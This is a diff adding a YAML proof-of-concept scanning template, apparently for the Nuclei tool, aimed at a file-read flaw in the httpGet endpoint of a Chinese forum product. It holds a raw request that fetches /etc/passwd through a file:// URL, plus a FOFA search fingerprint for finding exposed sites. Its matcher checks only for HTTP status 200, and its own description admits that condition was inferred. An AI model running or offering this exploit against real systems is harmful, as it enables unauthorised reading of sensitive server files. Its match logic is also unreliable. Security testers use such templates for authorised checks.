@@ -1,0 +1,31 @@
+id: poc-fa972pc34qgve1yt
+info:
+  name: 多客圈子论坛系统 httpGet接口处存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fa972pc34qgve1yt
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fa972pc34qgve1yt
+    fofa: body="/static/index/js/jweixin-1.2.0.js"
+http:
+- raw:
+  - 'GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/1.1
+
+    Host:127.0.0.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Connection: keep-alive'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
